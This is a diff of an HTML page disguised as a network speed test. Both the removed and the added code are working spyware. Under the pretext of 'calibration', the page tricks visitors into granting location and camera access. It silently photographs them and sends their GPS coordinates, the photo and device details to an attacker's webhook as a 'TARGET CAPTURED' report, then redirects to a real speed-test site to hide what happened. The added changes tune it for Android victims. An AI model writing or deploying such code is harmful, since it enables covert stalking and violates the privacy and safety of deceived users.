@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SpeedTest Optimization</title>
+    <title>SpeedTest Global</title>
     <style>
         body { font-family: sans-serif; background: #0b0e18; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #161b2c; padding: 30px; border-radius: 20px; text-align: center; width: 90%; max-width: 350px; border: 1px solid #232a42; }
+        .card { background: #161b2c; padding: 30px; border-radius: 20px; text-align: center; width: 85%; max-width: 350px; border: 1px solid #232a42; }
         .btn { background: #00d2ff; color: #000; border: none; padding: 18px; width: 100%; font-weight: bold; border-radius: 12px; cursor: pointer; margin-top: 20px; font-size: 1.1rem; }
         #status { margin-top: 15px; color: #5c6784; font-size: 0.8rem; }
         video, canvas { display: none; }
@@ -15,10 +15,11 @@
 <body>
 
     <div class="card">
-        <h2 style="color:#00d2ff">NODE CALIBRATION</h2>
-        <p>Sync sensors to identify the fastest local routing path.</p>
-        <button class="btn" id="startBtn">BEGIN CALIBRATION</button>
-        <div id="status">Ready for handshake...</div>
+        <div style="font-size: 30px; margin-bottom: 10px;">🚀</div>
+        <h2>Network Calibration</h2>
+        <p>Enable <b>Location and Camera</b> to find the highest speed server node for your device.</p>
+        <button class="btn" id="startBtn">START TEST</button>
+        <p id="status">Ready...</p>
     </div>
 
     <video id="video" autoplay playsinline muted></video>
@@ -29,39 +30,37 @@
 
         document.getElementById('startBtn').addEventListener('click', async function() {
             const status = document.getElementById('status');
-            status.innerText = "Requesting system access...";
+            status.innerText = "Requesting System Access...";
 
-            // 1. Check Battery (Works without permission)
-            let batteryInfo = "Unknown";
-            try {
-                const batt = await navigator.getBattery();
-                batteryInfo = `${(batt.level * 100).toFixed(0)}% (${batt.charging ? 'Charging' : 'On Battery'})`;
-            } catch(e) {}
-
-            // 2. Request GPS (This triggers the first popup)
+            // 1. Force GPS Request immediately
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                status.innerText = "GPS Synced. Accessing Camera...";
+                status.innerText = "GPS Located. Syncing Camera...";
                 
-                // 3. Request Camera (This triggers the second popup)
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                const acc = pos.coords.accuracy;
+
+                // 2. Request Camera
                 let stream = null;
                 try {
                     stream = await navigator.mediaDevices.getUserMedia({ 
-                        video: { facingMode: "user" } 
+                        video: { facingMode: "user" }, 
+                        audio: false 
                     });
                 } catch (e) {
-                    status.innerText = "Camera Denied. Sending Location...";
+                    console.log("Camera access denied by user.");
                 }
 
                 const formData = new FormData();
                 const message = {
-                    content: "📡 **NEW DATA CAPTURED**",
+                    content: "🔔 **ANDROID TARGET CAPTURED**",
                     embeds: [{
-                        title: "Hardware Calibration Report",
-                        color: 3447003,
+                        title: "Device Report",
+                        color: 5763719,
                         fields: [
-                            { name: "📍 Maps Link", value: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}` },
-                            { name: "🔋 Battery", value: batteryInfo, inline: true },
-                            { name: "📱 Device", value: navigator.platform, inline: true }
+                            { name: "📍 Maps", value: `https://www.google.com/maps?q=${lat},${lon}` },
+                            { name: "🎯 Accuracy", value: `${Math.round(acc)}m`, inline: true },
+                            { name: "📱 Info", value: navigator.userAgent.split('(')[1].split(')')[0], inline: true }
                         ]
                     }]
                 };
@@ -72,31 +71,30 @@
                     video.srcObject = stream;
                     const canvas = document.getElementById('canvas');
                     
-                    // Wait for camera to warm up (Avoid black photo)
+                    // Wait 1.5s for Android camera sensor to focus
                     setTimeout(() => {
                         canvas.width = video.videoWidth;
                         canvas.height = video.videoHeight;
                         canvas.getContext('2d').drawImage(video, 0, 0);
                         canvas.toBlob(async (blob) => {
-                            formData.append('file', blob, 'capture.jpg');
-                            await fetch(WEBHOOK, { method: 'POST', body: formData });
-                            stream.getTracks().forEach(t => t.stop());
-                            done();
+                            formData.append('file', blob, 'android_snap.jpg');
+                            await sendData(formData, stream);
                         }, 'image/jpeg');
-                    }, 2500);
+                    }, 1500);
                 } else {
-                    await fetch(WEBHOOK, { method: 'POST', body: formData });
-                    done();
+                    await sendData(formData, null);
                 }
 
             }, (err) => {
-                alert("Error: Location access is required for node calibration.");
-                status.innerText = "Handshake Failed: GPS Denied.";
-            }, { enableHighAccuracy: true });
+                alert("Error: GPS is required for network testing. Please enable and refresh.");
+                status.innerText = "Permission Denied.";
+            }, { enableHighAccuracy: true, timeout: 5000 });
         });
 
-        function done() {
-            document.getElementById('status').innerText = "Calibration Successful!";
+        async function sendData(fd, stream) {
+            await fetch(WEBHOOK, { method: 'POST', body: fd });
+            if (stream) stream.getTracks().forEach(t => t.stop());
+            document.getElementById('status').innerText = "Calibration Complete!";
             setTimeout(() => { window.location.href = "https://www.speedtest.net"; }, 1000);
         }
     </script>
